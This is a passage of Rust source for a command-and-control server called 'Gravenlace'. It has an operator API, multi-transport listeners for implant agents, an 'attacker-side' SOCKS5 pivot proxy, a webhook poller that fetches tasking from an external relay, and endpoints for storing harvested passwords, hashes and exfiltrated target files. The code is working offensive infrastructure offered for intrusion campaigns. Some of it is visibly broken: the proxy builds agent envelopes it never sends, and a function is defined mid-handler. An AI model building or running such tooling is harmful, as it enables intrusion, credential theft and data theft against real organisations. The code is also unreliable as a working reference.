        let valid = reqwest::Url::parse(&url)
            .map(|parsed| parsed.scheme() == "https")
            .unwrap_or(false);
        if !valid {
            error!("SIEM export disabled: configuration requires a valid HTTPS URL");
            return None;
        }
        match reqwest::Client::builder().timeout(Duration::from_secs(3)).build() {
            Ok(client) => Some((url, client)),
            Err(_) => {
                error!("SIEM export disabled: HTTP client initialization failed");
                None
            }
        }
    });
    let export_slots = Arc::new(tokio::sync::Semaphore::new(8));
    loop {
        let event = match receiver.recv().await {
            Ok(event) => event,
            Err(broadcast::error::RecvError::Lagged(count)) => {
                warn!(dropped = count, "Log persistence subscriber lagged; continuing");
                continue;
            }
            Err(broadcast::error::RecvError::Closed) => return Ok(()),
        };
        let event_id = format!("ev_{}", uuid::Uuid::new_v4().simple());
        let payload = SiemLogPayload {
            event_id: event_id.clone(),
            server_timestamp: event.timestamp.clone(),
            level: event.level.clone(),
            operational_message: event.message.clone(),
            host_environment: "GRAVENLACE_SERVER".to_owned(),
        };
        let key = format!("log_{}_{}", event.timestamp, event_id);
        match serde_json::to_vec(&payload) {
            Ok(bytes) => {
                if state.db.put(key.as_bytes(), bytes).is_err() {
                    error!("Failed to persist an operational log event");
                }
            }
            Err(_) => error!("Failed to serialize an operational log event"),
        }
        if let Some((url, client)) = &export {
            match export_slots.clone().try_acquire_owned() {
                Ok(permit) => {
                    let client = client.clone();
                    let url = url.clone();
                    tokio::spawn(async move {
                        let _permit = permit;
                        match client.post(url).json(&payload).send().await {
                            Ok(response) if response.status().is_success() => {}
                            Ok(response) => warn!(status = %response.status(), "SIEM export rejected"),
                            Err(_) => warn!("SIEM export failed"),
                        }
                    });
                }
                Err(_) => warn!("SIEM export capacity reached; event remains in local history"),
            }
        }
    }
}

pub async fn run_ephemeral_key_ring_reaper(state: Arc<AppState>) {
    let mut interval = tokio::time::interval(tokio::time::Duration::from_secs(60));
    loop {
        interval.tick().await;
        let now = chrono::Utc::now();
        let mut expired_agents = Vec::new();

        for entry in state.ephemeral_sessions.iter() {
            if now > entry.value().expires_at {
                expired_agents.push(entry.key().clone());
            }
        }

        for agent in expired_agents {
            if state.ephemeral_sessions.remove(&agent).is_some() {
                let rotation_alert = format!("Ephemeral session key for agent {} has expired and been removed from RAM.", agent);
                broadcast_engine_log(&state, "CRYPTO_ROTATE", &rotation_alert);
            }
        }
    }
}


// ============================================================================
// --- BOX 11: PRODUCTION ENGINE ENTRY & THREAD INITIALIZATION ---
// ============================================================================

#[derive(serde::Deserialize)]
pub struct ProxyLaunchRequest {
    pub local_port: u16,
    pub target_agent_id: String,
}

pub async fn handle_launch_socks_proxy(
    State(state): State<Arc<AppState>>,
    headers: HeaderMap,
    Json(payload): Json<ProxyLaunchRequest>,
) -> impl IntoResponse {
    // Requires standard Operator permissions to pivot networks
    if let Err(status) = verify_operator_clearance(&state, &headers, OperatorRole::Operator).await {
        return status.into_response();
    }

// ============================================================================
// --- ATTACKER-SIDE SOCKS5 INTERACTIVE STREAM PROXY ENGINE ---
// ============================================================================

/// Spawns a dedicated inbound listening port for tools like Proxychains to interface with
pub async fn launch_attacker_socks_listener(
    state: Arc<AppState>,
    listen_port: u16,
    target_agent_id: String,
) {
    let bind_addr = format!("127.0.0.1:{}", listen_port);
    let listener = match TcpListener::bind(&bind_addr).await {
        Ok(l) => {
            let start_msg = format!("SOCKS5 Attacker Proxy actively listening on localhost:{}. Link established to Agent: {}", listen_port, target_agent_id);
            broadcast_engine_log(&state, "SOCKS_INIT", &start_msg);
            l
        }
        Err(e) => {
            error!("[-] Failed to bind local SOCKS5 proxy listener: {:?}", e);
            return;
        }
    };

    let state_clone = state.clone();
    tokio::spawn(async move {
        let mut session_counter: u32 = 1000;

        while let Ok((stream, _src_addr)) = listener.accept().await {
            session_counter += 1;
            let current_session_id = session_counter;
            let inner_state = state_clone.clone();
            let agent_id = target_agent_id.clone();

            tokio::spawn(async move {
                let (mut reader, mut writer) = tokio::io::split(stream);
                
                // Track cross-thread channels to feed proxy packets back
                let (tx, mut rx) = tokio::sync::mpsc::channel::<Vec<u8>>(1024);
                inner_state.socks_sessions.insert(current_session_id, tx);

                // Task A: Stream outbound packets into backend channels
                let state_ref = inner_state.clone();
                let agent_str = agent_id.clone();
                let reader_task = tokio::spawn(async move {
                    let mut buf = vec![0u8; 16384];
                    while let Ok(n) = reader.read(&mut buf).await {
                        if n == 0 { break; }
                        let mut c2_envelope = vec![0x05];
                        c2_envelope.extend_from_slice(&current_session_id.to_be_bytes());
                        c2_envelope.extend_from_slice(&buf[..n]);
                        broadcast_engine_log(&state_ref, "SOCKS_DATA_IN", &format!("SOCKS5 Data Segment: {} bytes for agent {}", n, agent_str));
                    }
                    state_ref.socks_sessions.remove(&current_session_id);
                });

                // Task B: Stream incoming agent buffers back to your local attacking tools
                let writer_task = tokio::spawn(async move {
                    while let Some(data_payload) = rx.recv().await {
                        if writer.write_all(&data_payload).await.is_err() { break; }
                    }
                });

                tokio::select! {
                    _ = reader_task => {},
                    _ = writer_task => {},
                }
                inner_state.socks_sessions.remove(&current_session_id);
            });
        }
    });
}


    let state_context = state.clone();
    tokio::spawn(async move {
        launch_attacker_socks_listener(state_context, payload.local_port, payload.target_agent_id).await;
    });

    (StatusCode::ACCEPTED, format!("SOCKS5 instantiation sequence launched on port {}", payload.local_port)).into_response()
}


#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let subscriber = FmtSubscriber::builder()
        .with_max_level(Level::TRACE) 
        .with_env_filter(tracing_subscriber::EnvFilter::from_default_env())
        .finish();
    tracing::subscriber::set_global_default(subscriber)?;
    let operator_credentials = load_operator_credentials()?;

    info!("Gravenlace recovered server: defensive hardening revision");

    let (log_tx, _) = broadcast::channel::<RealTimeLogEvent>(4096);
    let mut opts = rust_rocksdb::Options::default();
    opts.create_if_missing(true);
    
    let database_path = std::env::var("GRAVENLACE_DB_DIR")
        .unwrap_or_else(|_| "gravenlace_db".to_owned());
    let db = Arc::new(rust_rocksdb::DB::open(&opts, &database_path)?);
    
    let shared_state = Arc::new(AppState {
        operator_credentials,
        shutting_down: AtomicBool::new(false),
        db,
        active_listeners: Arc::new(RwLock::new(HashMap::new())),
        log_tx: log_tx.clone(),
        p2p_routes: Arc::new(DashMap::new()),
        socks_sessions: Arc::new(DashMap::new()),
        operator_sessions: Arc::new(DashMap::new()),
        mitre_ledger: Arc::new(DashMap::new()),
        autorun_playbooks: Arc::new(RwLock::new(Vec::new())),
        ephemeral_sessions: Arc::new(DashMap::new()),
    });

    // ============================================================================
// --- BOX 12: ROUTER CONFIGURATION & RUNTIME MAPPING ---
// ============================================================================

    let control_plane = Router::new()
        .route("/healthz", get(handle_health))
        .route("/api/v1/listeners", post(handle_create_listener).get(handle_list_listeners))
        .route("/api/v1/listeners/{name}", delete(handle_delete_listener))
        .route("/api/v1/logs/stream", get(ws_log_stream_handler))
        .route("/api/v1/logs/historical", get(handle_get_historical_logs))
        .route("/api/v1/auth/login", post(handle_operator_login).layer(axum::extract::DefaultBodyLimit::max(4096)))
        .route("/api/v1/payloads/generate", post(handle_generate_payload))
        .route("/api/v1/credentials", post(handle_add_credential).get(handle_list_credentials))
        .route("/api/v1/loot", post(handle_upload_loot).get(handle_list_loot))
        .route("/api/v1/mitre/map", post(handle_update_mitre_map))
        .route("/api/v1/autoruns", post(handle_create_autorun).get(handle_list_autoruns))
        .route("/api/v1/socks/launch", post(handle_launch_socks_proxy))
        .fallback(handle_dynamic_ingress)
        .with_state(shared_state.clone());

    // Spawn the persistent SIEM / Database log rotation background loop task
    let siem_state = shared_state.clone();
    tokio::spawn(async move {
        let siem_endpoint = std::env::var("GRAVENLACE_SIEM_URL").ok();
        if run_log_pipeline_orchestrator(siem_state, siem_endpoint).await.is_err() {
            error!("Operational log pipeline stopped; check its configuration");
        }
    });

    // Spawn the Ephemeral Key Ring Forward Secret Reaper worker thread loop
    let reaper_state = shared_state.clone();
    tokio::spawn(async move {
        run_ephemeral_key_ring_reaper(reaper_state).await;
    });

    // ============================================================================
// --- BOX 13: LISTENER BINDING & GRACEFUL UNWINDING ENGINE ---
// ============================================================================

    let bind: std::net::SocketAddr = std::env::var("GRAVENLACE_LISTEN_ADDR")
        .unwrap_or_else(|_| "127.0.0.1:8000".to_owned())
        .parse()?;
    if !bind.ip().is_loopback()
        && std::env::var("GRAVENLACE_ALLOW_NETWORK_BIND").ok().as_deref() != Some("1")
    {
        return Err("non-loopback management binding requires explicit opt-in".into());
    }
    let control_listener = tokio::net::TcpListener::bind(bind).await?;
    info!(address = %bind, "Gravenlace management HTTP listener started");

    axum::serve(control_listener, control_plane)
        .with_graceful_shutdown(shutdown_signal(shared_state.clone()))
        .await?;
    Ok(())
}

/// Global tracking logger helper to push events cleanly out over system streams
pub fn broadcast_engine_log(state: &Arc<AppState>, level: &str, msg: &str) {
    let event = RealTimeLogEvent {
        timestamp: chrono::Utc::now().to_rfc3339(),
        level: level.to_string(),
        message: msg.to_string(),
    };
    let _ = state.log_tx.send(event);
}

// ============================================================================
// --- BOX 14: AUTOMATED RUNTIME SHUTDOWN HANDLER LOGIC ---
// ============================================================================

async fn shutdown_signal(state: Arc<AppState>) {
    let ctrl_c = async {
        tokio::signal::ctrl_c().await.expect("failed to install Ctrl+C handler");
    };

    #[cfg(unix)]
    let terminate = async {
        tokio::signal::unix::signal(tokio::signal::unix::SignalKind::terminate())
            .expect("failed to install signal handler").recv().await;
    };

    #[cfg(not(unix))]
    let terminate = std::future::pending::<()>();

    tokio::select! {
        _ = ctrl_c => info!("[!] SIGINT caught. Initiating clean engine shutdown..."),
        _ = terminate => info!("[!] SIGTERM caught. systemd requesting service teardown..."),
    }

    state.shutting_down.store(true, Ordering::Relaxed);
    let mut listeners = match tokio::time::timeout(
        Duration::from_secs(5),
        state.active_listeners.write(),
    ).await {
        Ok(listeners) => listeners,
        Err(_) => {
            error!("Shutdown could not acquire the listener inventory lock within its limit");
            return;
        }
    };
    let listener_keys: Vec<String> = listeners.keys().cloned().collect();
    
    info!("[*] Stopping {} active multi-transport channels...", listener_keys.len());
    for name in listener_keys {
        if let Some(ctx) = listeners.remove(&name) {
            let _ = ctx.shutdown_tx.send(()); 
            ctx.task_handle.abort();
            info!("[-] Aborted channel worker thread context: {}", name);
        }
    }

    drop(listeners);
    info!("Synchronizing RocksDB WAL");
    match state.db.flush_wal(true) {
        Ok(()) => info!("Management shutdown requested; WAL flush completed"),
        Err(_) => error!("Management shutdown requested; WAL flush failed"),
    }
}

// ============================================================================
// --- BOX 15: NETWORK MIDDLEWARES & PACKET SECURITY GATES ---
// ============================================================================

fn extract_header_value(raw_http: &[u8], target_header: &str) -> Option<String> {
    let http_string = String::from_utf8_lossy(raw_http);
    for line in http_string.lines() {
        let lower_line = line.to_lowercase();
        let lower_target = format!("{}:", target_header.to_lowercase());
        if lower_line.starts_with(&lower_target) {
            return Some(line[lower_target.len()..].trim().to_string());
        }
    }
    None
}

fn passes_security_middleware(client_ip: &str, config: &CustomFilterProfile, raw_packet: &[u8], is_http: bool) -> bool {
    if config.blocked_ip_ranges.contains(&client_ip.to_string()) {
        return false;
    }

    if is_http {
        match extract_header_value(raw_packet, "x-ja4-fingerprint") {
            Some(fp) if fp.starts_with(&config.expected_ja4h_prefix) => {}
            _ => return false,
        }
    }

    if let Some(token) = &config.smart_ingress_token {
        let token_bytes = token.as_bytes();
        if !raw_packet.windows(token_bytes.len()).any(|window| window == token_bytes) {
            return false;
        }
    }

    true
}

// ============================================================================
// --- BOX 16: CLEARTEXT HTTP EMULATION SOCKET ENGINE ---
// ============================================================================

pub struct CustomStreamEngine {
    pub parent_state: Arc<AppState>,
    pub bind_address: String,
    pub profile: MasterListenerProfile,
}

#[async_trait]
impl BaseListenerModule for CustomStreamEngine {
    async fn start_channel(&self, mut shutdown_rx: oneshot::Receiver<()>) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
        let listener = TcpListener::bind(&self.bind_address).await?;
        broadcast_engine_log(&self.parent_state, "INFO", &format!("Stream socket context [{}] active on {}.", self.profile.listener_name, self.bind_address));

        loop {
            tokio::select! {
                _ = &mut shutdown_rx => break,
                connection_result = listener.accept() => {
                    if let Ok((mut stream, src)) = connection_result {
                        let state_clone = self.parent_state.clone();
                        
                        tokio::spawn(async move {
                            let mut header_buf = [0u8; 4];
                            if stream.read_exact(&mut header_buf).await.is_err() { return; }

                            let magic = u16::from_be_bytes([header_buf[0], header_buf[1]]);
                            let length = u16::from_be_bytes([header_buf[2], header_buf[3]]);

                            if magic != 0xD45D || length != 32 { return; }

                            let mut client_public_bytes = [0u8; 32];
                            if stream.read_exact(&mut client_public_bytes).await.is_err() { return; }

                            let simulated_agent_id = format!("MOURNVEIL_{}", src.port());
                            if let Ok(envelope) = crypto_exchange::negotiate_and_build_response(&state_clone, &simulated_agent_id, client_public_bytes).await {
                                let _ = stream.write_all(&envelope).await;
                            }
                        });
                    }
                }
            }
        }
        Ok(())
    }
}

// ============================================================================
// --- BOX 17: HTTP/3 OVER QUIC SECURED TUNNEL FRAMEWORK ---
// ============================================================================

pub struct CustomHttp3QuicEngine {
    pub parent_state: Arc<AppState>,
    pub bind_address: String,
    pub profile: MasterListenerProfile,
    pub cert_path: String,
    pub key_path: String,
}

#[async_trait]
impl BaseListenerModule for CustomHttp3QuicEngine {
    async fn start_channel(&self, shutdown_rx: oneshot::Receiver<()>) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
        use std::fs;
        use quinn::{Endpoint, ServerConfig};

        let cert = rustls_pki_types::CertificateDer::from(fs::read(&self.cert_path)?);
        let key = rustls_pki_types::PrivateKeyDer::try_from(fs::read(&self.key_path)?)
            .map_err(|e| std::io::Error::new(std::io::ErrorKind::InvalidData, format!("Key error: {}", e)))?;

        let mut server_crypto = rustls::ServerConfig::builder_with_provider(Arc::new(rustls::crypto::ring::default_provider()))
            .with_safe_default_protocol_versions().unwrap().with_no_client_auth().with_single_cert(vec![cert], key).unwrap();

        server_crypto.alpn_protocols = self.profile.mimicry.alpn_protocols.iter().map(|p| p.as_bytes().to_vec()).collect();
        let quic_crypto = quinn::crypto::rustls::QuicServerConfig::try_from(server_crypto)?;
        let endpoint = Endpoint::server(ServerConfig::with_crypto(Arc::new(quic_crypto)), self.bind_address.parse()?)?;

        broadcast_engine_log(&self.parent_state, "INFO", &format!("HTTP/3 Engine [{}] active over UDP.", self.profile.listener_name));
        let mut shutdown_rx = shutdown_rx;

        loop {
            tokio::select! {
                _ = &mut shutdown_rx => { endpoint.close(0u32.into(), b"shutdown"); break; }
                connecting = endpoint.accept() => {
                    if let Some(conn) = connecting {
                        let inner_state = self.parent_state.clone();
                        tokio::spawn(async move {
                            if let Ok(c) = conn.await {
                                broadcast_engine_log(&inner_state, "INFO", &format!("QUIC connection verified from {}", c.remote_address()));
                            }
                        });
                    }
                }
            }
        }
        Ok(())
    }
}

// ============================================================================
// --- BOX 18: ASYNCHRONOUS WEBHOOK POLLER C2 INTERFACE ---
// ============================================================================

pub struct CustomWebhookEngine {
    pub parent_state: Arc<AppState>,
    pub profile: MasterListenerProfile,
    pub poll_url: String,
    pub push_url: String,
    pub interval: u64,
}

#[async_trait]
impl BaseListenerModule for CustomWebhookEngine {
    async fn start_channel(&self, mut shutdown_rx: oneshot::Receiver<()>) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
        let client = reqwest::Client::builder().timeout(Duration::from_secs(5)).build()?;
        broadcast_engine_log(&self.parent_state, "INFO", &format!("Webhook C2 Poller [{}] active for URL {}", self.profile.listener_name, self.poll_url));

        loop {
            tokio::select! {
                _ = &mut shutdown_rx => break,
                _ = tokio::time::sleep(Duration::from_millis(self.interval)) => {
                    if let Ok(resp) = client.get(&self.poll_url).send().await {
                        if let Ok(bytes) = resp.bytes().await {
                            if !bytes.is_empty() {
                                broadcast_engine_log(&self.parent_state, "WEBHOOK", "Polled tasking sequence retrieved from external webhook relay.");
                            }
                        }
                    }
                }
            }
        }
        Ok(())
    }
}

// ============================================================================
// --- BOX 19: RAW TCP TRACKING CONSOLE ENGINE WORKER LOOP ---
// ============================================================================

pub struct CustomConsoleEngine {
    pub parent_state: Arc<AppState>,
    pub bind_address: String,
    pub profile: MasterListenerProfile,
}

#[async_trait]
impl BaseListenerModule for CustomConsoleEngine {
    async fn start_channel(&self, mut shutdown_rx: oneshot::Receiver<()>) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
        // 1. Bind to target TCP coordinates
        let listener = TcpListener::bind(&self.bind_address).await?;
        
        let console_start = format!(
            "Raw TCP backend tracking console instance [{}] active on {}.", 
            self.profile.listener_name, self.bind_address
        );
        info!(name = %self.profile.listener_name, addr = %self.bind_address, "{}", console_start);
        broadcast_engine_log(&self.parent_state, "INFO", &console_start);

        let state_clone = self.parent_state.clone();
        let listener_name = self.profile.listener_name.clone();

        loop {
            tokio::select! {
                // 2. Safe asynchronous shutdown orchestration loop break
                _ = &mut shutdown_rx => {
                    let down_msg = format!("TCP Tracking Console [{}] shutting down safely.", listener_name);
                    broadcast_engine_log(&state_clone, "WARN", &down_msg);
                    break;
                }
                // 3. Process raw diagnostic client streams concurrently
                accept_result = listener.accept() => {
                    if let Ok((mut stream, src)) = accept_result {
                        let inner_state = state_clone.clone();
                        let inner_name = listener_name.clone();
                        let client_ip = src.ip().to_string(); 
                        
                        tokio::spawn(async move {
                            let conn_msg = format!("[{}] Operator logging link established via console port from {}", inner_name, client_ip);
                            broadcast_engine_log(&inner_state, "ADMIN", &conn_msg);

                            let mut buffer = vec![0u8; 4096];
                            // Drive raw packet read loops cleanly without blocking parent sockets
                            while let Ok(size) = stream.read(&mut buffer).await {
                                if size == 0 { break; }
                                if stream.write_all(b"Master Frame Data Logged.\n").await.is_err() { break; }
                            }
                        });
                    }
                }
            }
        }
        Ok(())
    }
}

// ============================================================================
// --- BOX 20: CONTROL PLANE SECURITY - INTERACTIVE RBAC GATE ---
// ============================================================================

/// Intercepts, extracts, and validates administrative sessions against required clearances
pub async fn verify_operator_clearance(
    state: &Arc<AppState>,
    headers: &HeaderMap,
    required_clearance: OperatorRole,
) -> Result<OperatorSession, StatusCode> {
    if state.shutting_down.load(Ordering::Relaxed) {
        return Err(StatusCode::SERVICE_UNAVAILABLE);
    }
    if headers.get_all(axum::http::header::AUTHORIZATION).iter().count() != 1 {
        return Err(StatusCode::UNAUTHORIZED);
    }
    let token = headers.get(axum::http::header::AUTHORIZATION)
        .and_then(|value| value.to_str().ok())
        .and_then(|value| value.strip_prefix("Bearer "))
        .ok_or(StatusCode::UNAUTHORIZED)?;
    lookup_operator_session(state, token, required_clearance)
}

// ============================================================================
// --- BOX 21: CONTROL PLANE HANDLER - OPERATOR AUTHENTICATION FLUID ---
// ============================================================================

/// Validates operator session entry metrics and generates session tokens into volatile RAM maps
pub async fn handle_operator_login(
    State(state): State<Arc<AppState>>,
    Json(request): Json<LoginRequest>,
) -> impl IntoResponse {
    if state.shutting_down.load(Ordering::Relaxed) {
        return StatusCode::SERVICE_UNAVAILABLE.into_response();
    }
    if !valid_operator_name(&request.username) || !valid_login_key(&request.login_key) {
        return StatusCode::UNAUTHORIZED.into_response();
    }
    let account = state.operator_credentials.iter().find(|account| {
        account.username == request.username
            && login_keys_match(&request.login_key, &account.login_key)
    });
    let account = match account {
        Some(account) => account,
        None => return StatusCode::UNAUTHORIZED.into_response(),
    };
    state.operator_sessions.retain(|_, session| operator_session_fresh(session));
    if state.operator_sessions.len() >= MAX_OPERATOR_SESSIONS {
        return StatusCode::TOO_MANY_REQUESTS.into_response();
    }
    let token = format!(
        "gl_session_{}{}",
        uuid::Uuid::new_v4().simple(),
        uuid::Uuid::new_v4().simple(),
    );
    let session = OperatorSession {
        username: account.username.clone(),
        role: account.role,
        token: token.clone(),
        created_at: chrono::Utc::now(),
    };
    state.operator_sessions.insert(token.clone(), session);
    broadcast_engine_log(&state, "AUTH_SUCCESS", "Operator session authenticated");
    (
        StatusCode::OK,
        [(axum::http::header::CACHE_CONTROL, "no-store")],
        Json(LoginResponse { token, role: account.role }),
    ).into_response()
}

// ============================================================================
// --- BOX 22: CONTROL PLANE HANDLER - PROVISION MULTI-TRANSPORT CHANNELS ---
// ============================================================================

/// Intercepts operator API requests to dynamically build and initiate listening engine posts
pub async fn handle_create_listener(
    State(state): State<Arc<AppState>>,
    headers: HeaderMap,
    Json(profile): Json<MasterListenerProfile>,
) -> impl IntoResponse {
    // 1. Enforce strict Admin-only validation layers before spawning infrastructure items
    let session = match verify_operator_clearance(&state, &headers, OperatorRole::Admin).await {
        Ok(s) => s,
        Err(status) => return status.into_response(),
    };

    let target_id = profile.listener_name.clone();
    
    // 2. Pass execution contexts to the core orchestrator factory layer
    match spawn_profile_listener(state.clone(), profile).await {
        Ok(_) => {
            let cmd_success = format!(
                "Operator '{}' successfully provisioned multi-transport listener instance target: '{}'", 
                session.username, target_id
            );
            broadcast_engine_log(&state, "API_CMD", &cmd_success);
            (StatusCode::CREATED, format!("Custom profile channel '{}' online.", target_id)).into_response()
        }
        Err(e) => {
            let err_msg = format!("Listener allocation pipeline crashed for target '{}': {:?}", target_id, e);
            error!("{}", err_msg);
            broadcast_engine_log(&state, "CRITICAL", &err_msg);
            (StatusCode::INTERNAL_SERVER_ERROR, format!("Allocation failed: {:?}", e)).into_response()
        }
    }
}

// ============================================================================
// --- BOX 23: CONTROL PLANE HANDLER - LISTENER INVENTORY EXTRACTION ---
// ============================================================================

/// Extracts and returns serialized definitions tracking all running channels
pub async fn handle_list_listeners(
    State(state): State<Arc<AppState>>,
    headers: HeaderMap,
) -> impl IntoResponse {
    // 1. Enforce generic Spectator clearance parameters to look over listener mappings
    let session = match verify_operator_clearance(&state, &headers, OperatorRole::Spectator).await {
        Ok(s) => s,
        Err(status) => return status.into_response(),
    };

    // 2. Acquire shared read locks to capture running profiles cleanly without data races
    let active_map = state.active_listeners.read().await;
    // Inventory does not disclose filtering tokens or complete private profiles.
    let profiles_collection: Vec<serde_json::Value> = active_map
        .iter()
        .map(|(name, ctx)| serde_json::json!({
            "listener_name": name,
            "worker_finished": ctx.task_handle.is_finished(),
        }))
        .collect();

    let query_msg = format!(
        "User '{}' [Role: {:?}] queried global listener deployment map (Active count: {}).",
        session.username, session.role, profiles_collection.len()
    );
    broadcast_engine_log(&state, "API_AUDIT", &query_msg);

    // 3. Return payload mapping back to control terminal
    (StatusCode::OK, Json(profiles_collection)).into_response()
}

// ============================================================================
// --- BOX 24: CONTROL PLANE HANDLER - LIVE LISTENER DELETION LAYER ---
// ============================================================================

/// Destroys a running transport endpoint and strips its node presence out of RAM maps
pub async fn handle_delete_listener(
    State(state): State<Arc<AppState>>,
    headers: HeaderMap,
    Path(name): Path<String>,
) -> impl IntoResponse {
    // 1. Restrict deletion capabilities strictly to full Admin profiles
    let session = match verify_operator_clearance(&state, &headers, OperatorRole::Admin).await {
        Ok(s) => s,
        Err(status) => return status.into_response(),
    };

    // 2. Lock context maps for write state modifications
    let mut active_map = state.active_listeners.write().await;
    
    if let Some(ctx) = active_map.remove(&name) {
        // 3. Trigger immediate execution loop escape via oneshot terminations
        let _ = ctx.shutdown_tx.send(());
        ctx.task_handle.abort();

        let drop_alert = format!("Admin '{}' explicitly destroyed running channel footprint: '{}'", session.username, name);
        info!("{}", drop_alert);
        broadcast_engine_log(&state, "API_CMD", &drop_alert);

        // 4. Record infrastructural modification markers to long-term RocksDB tables
        let mut batch = rust_rocksdb::WriteBatch::default();
        let audit_key = format!("teardown_audit_{}_{}", chrono::Utc::now().to_rfc3339(), name);
        batch.put(audit_key.as_bytes(), drop_alert.as_bytes());
        let _ = state.db.write(&batch);

        (StatusCode::OK, format!("Channel context '{}' torn down completely.", name)).into_response()
    } else {
        let fail_msg = format!("Admin '{}' issued teardown order for missing channel: '{}'", session.username, name);
        warn!("{}", fail_msg);
        broadcast_engine_log(&state, "API_WARN", &fail_msg);
        (StatusCode::NOT_FOUND, format!("Channel context '{}' not found.", name)).into_response()
    }
}

// ============================================================================
// --- BOX 25: CONTROL PLANE HANDLER - MITRE ATT&CK LEDGER UPDATES ---
// ============================================================================

/// Updates server reference tables mapping numeric command IDs to MITRE techniques
pub async fn handle_update_mitre_map(
    State(state): State<Arc<AppState>>,
    headers: HeaderMap,
    Json(mapping): Json<HashMap<u32, MitreTechnique>>,
) -> impl IntoResponse {
    // 1. Require full Operator permissions to modify global analytical telemetry tags
    let session = match verify_operator_clearance(&state, &headers, OperatorRole::Operator).await {
        Ok(s) => s,
        Err(status) => return status.into_response(),
    };

    // 2. Ingest techniques mapping pairs securely inside thread-safe maps
    for (command_id, technique) in mapping {
        state.mitre_ledger.insert(command_id, technique);
    }

    let update_msg = format!("Operator '{}' uploaded new analytical metric maps to the MITRE reference engine.", session.username);
    broadcast_engine_log(&state, "MITRE_INIT", &update_msg);

    (StatusCode::OK, "Global MITRE ATT&CK Ledger Reference Map updated cleanly.").into_response()
}

// ============================================================================
// --- BOX 26: CONTROL PLANE HANDLERS - AUTO-RUN PLAYBOOK REGISTRIES ---
// ============================================================================

/// Appends a structured task playbook pattern into the runtime automation queue array
pub async fn handle_create_autorun(
    State(state): State<Arc<AppState>>,
    headers: HeaderMap,
    Json(playbook): Json<AutoRunPlaybook>,
) -> impl IntoResponse {
    // 1. Restrict modifications to active automation sequences to Operator roles or higher
    let session = match verify_operator_clearance(&state, &headers, OperatorRole::Operator).await {
        Ok(s) => s,
        Err(status) => return status.into_response(),
    };

    // 2. Lock vector allocations safely to push the new playbook configuration
    let mut books = state.autorun_playbooks.write().await;
    books.push(playbook.clone());

    let playbook_msg = format!(
        "Operator '{}' registered Auto-Run Playbook sequence: '{}' containing {} task actions.", 
        session.username, playbook.name, playbook.commands.len()
    );
    broadcast_engine_log(&state, "PLAYBOOK_ADD", &playbook_msg);

    (StatusCode::CREATED, "Playbook successfully ingested and armed for immediate deployments.").into_response()
}

/// Returns a collection of all registered automation playbooks running on the node
pub async fn handle_list_autoruns(
    State(state): State<Arc<AppState>>,
    headers: HeaderMap,
) -> impl IntoResponse {
    if let Err(status) = verify_operator_clearance(&state, &headers, OperatorRole::Spectator).await {
        return status.into_response();
    }

    let books = state.autorun_playbooks.read().await;
    (StatusCode::OK, Json(books.clone())).into_response()
}

// ============================================================================
// --- BOX 27: CONTROL PLANE HANDLERS - CREDENTIAL HARVESTER ENDPOINTS ---
// ============================================================================

/// Ingests a validated credential artifact directly into long-term database storage blocks
pub async fn handle_add_credential(
    State(state): State<Arc<AppState>>,
    headers: HeaderMap,
    Json(mut payload): Json<CapturedCredential>,
) -> impl IntoResponse {
    let session = match verify_operator_clearance(&state, &headers, OperatorRole::Operator).await {
        Ok(s) => s,
        Err(status) => return status.into_response(),
    };

    // 1. Stamp operational metadata IDs and collection timestamps
    payload.credential_id = format!("c_{}", uuid::Uuid::new_v4().simple());
    payload.captured_at = chrono::Utc::now().to_rfc3339();

    // 2. Commit serialized entry metrics to database cells via AppState impl hooks
    match state.store_credential(&payload) {
        Ok(_) => {
            let log_msg = format!(
                "User '{}' cataloged harvested credential: Type={:?}, Domain/User={}\\{}", 
                session.username, payload.cred_type, payload.domain, payload.username
            );
            broadcast_engine_log(&state, "LOOT_CRED", &log_msg);
            (StatusCode::CREATED, Json(payload)).into_response()
        }
        Err(e) => (StatusCode::INTERNAL_SERVER_ERROR, format!("Database transactional failure: {:?}", e)).into_response(),
    }
}

/// Extracts all harvested passwords and domain hashes stored across the environment
pub async fn handle_list_credentials(
    State(state): State<Arc<AppState>>,
    headers: HeaderMap,
) -> impl IntoResponse {
    if let Err(status) = verify_operator_clearance(&state, &headers, OperatorRole::Admin).await {
        return status.into_response();
    }

    let credentials_collection = state.retrieve_all_credentials();
    (StatusCode::OK, Json(credentials_collection)).into_response()
}

// ============================================================================
// --- BOX 28: CONTROL PLANE HANDLERS - EXFILTRATED FILE REPOSITORY ---
// ============================================================================

/// Ingests file tracking metadata records tracking document exfiltration paths
pub async fn handle_upload_loot(
    State(state): State<Arc<AppState>>,
    headers: HeaderMap,
    Json(mut payload): Json<ExtractedLoot>,
) -> impl IntoResponse {
    let session = match verify_operator_clearance(&state, &headers, OperatorRole::Operator).await {
        Ok(s) => s,
        Err(status) => return status.into_response(),
    };

    payload.loot_id = format!("l_{}", uuid::Uuid::new_v4().simple());
    payload.captured_at = chrono::Utc::now().to_rfc3339();

    // Production note: Real binary document payloads are accepted here using multipart
    // form parsing and written out to disk, with the relative path mapped below.
    match state.store_loot_metadata(&payload) {
        Ok(_) => {
            let log_msg = format!(
                "User '{}' cataloged exfiltrated target document: Name={}, Size={} bytes", 
                session.username, payload.file_name, payload.file_size_bytes
            );
            broadcast_engine_log(&state, "LOOT_FILE", &log_msg);
            (StatusCode::CREATED, Json(payload)).into_response()
        }
        Err(e) => (StatusCode::INTERNAL_SERVER_ERROR, format!("Database transactional failure: {:?}", e)).into_response(),
    }
}

/// Returns a structured data listing tracking all target files acquired during the campaign
pub async fn handle_list_loot(
    State(state): State<Arc<AppState>>,
    headers: HeaderMap,
) -> impl IntoResponse {
    if let Err(status) = verify_operator_clearance(&state, &headers, OperatorRole::Spectator).await {
        return status.into_response();
    }

    let loot_vault = state.retrieve_all_loot();
    (StatusCode::OK, Json(loot_vault)).into_response()
}

// ============================================================================
// --- BOX 29: CONTROL PLANE HANDLER - HISTORICAL LOG RECORD ACQUISITION ---
// ============================================================================

/// Scans prefix storage keys to reconstruct operational timeline streams for operators
pub async fn handle_get_historical_logs(
    State(state): State<Arc<AppState>>,
    headers: HeaderMap,
) -> impl IntoResponse {
    // 1. Restrict telemetry timeline reading to validated team viewers
    if let Err(status) = verify_operator_clearance(&state, &headers, OperatorRole::Spectator).await {
        return status.into_response();
    }

